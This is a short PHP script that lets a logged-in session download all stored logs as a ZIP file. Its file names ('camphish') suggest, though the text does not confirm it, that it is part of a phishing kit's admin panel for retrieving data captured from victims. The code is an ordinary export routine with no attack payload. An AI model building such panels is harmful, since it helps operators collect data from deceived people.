<?php
// download_zip.php — one-click export of all logs as a ZIP archive
session_start();
$cfg = include __DIR__ . '/config.php';
$pw  = $cfg['admin_password'] ?? 'admin';
if (empty($_SESSION['auth'])) { http_response_code(403); exit('Unauthorized'); }

require_once __DIR__ . '/helpers.php';

$zip_path = sys_get_temp_dir() . '/camphish_logs_' . date('YmdHis') . '.zip';

if (!zip_all_logs($zip_path)) {
    http_response_code(500);
    echo 'Failed to create ZIP. Make sure the ZipArchive PHP extension is enabled.';
    exit();
}

header('Content-Type: application/zip');
header('Content-Disposition: attachment; filename="camphish_export_' . date('YmdHis') . '.zip"');
header('Content-Length: ' . filesize($zip_path));
readfile($zip_path);
@unlink($zip_path);
exit();
